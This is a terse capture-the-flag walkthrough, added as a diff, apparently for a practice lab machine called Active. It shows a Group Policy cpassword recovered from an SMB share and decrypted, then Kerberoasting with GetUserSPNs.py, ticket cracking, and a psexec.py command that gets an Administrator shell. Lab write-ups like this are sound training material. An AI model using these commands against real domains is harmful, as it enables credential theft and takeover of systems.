@@ -1,0 +1,36 @@
+[+] Domain: active.htb
+
+[+] SMB: 
+//10.10.10.100/Replication (R/O)
+
+[+] Groups.xml:
+
+userName="active.htb\SVC_TGS" 
+cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+
+Note: cpassword is called GPP (Group Policy Password). There is gpp-decrypt for it.
+
+[+] Decrypted: GPPstillStandingStrong2k18
+
+[+] SMB:
+
+//10.10.10.100/NETLOGON (R/O)
+//10.10.10.100/Replication (R/O)
+//10.10.10.100/SYSVOL (R/O)
+//10.10.10.100/Users (R/O)
+
+[+] Found user.txt in //10.10.10.100/Users/SVC_TGS/Desktop
+
+[*] Nothing more there.
+
+[*] We have a user. And we have Kerberos. 2+2=
+
+root@parrot# python3 `locate GetUserSPNs.py` -dc-ip 10.10.10.100 -request active.htb/SVC_TGS
+
+[+] Got Administrator's ticket!
+
+[+] JTR cracked it. Getting shell using psexec:
+
+root@parrot# python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@10.10.10.100
+
+[+] Found root.txt.
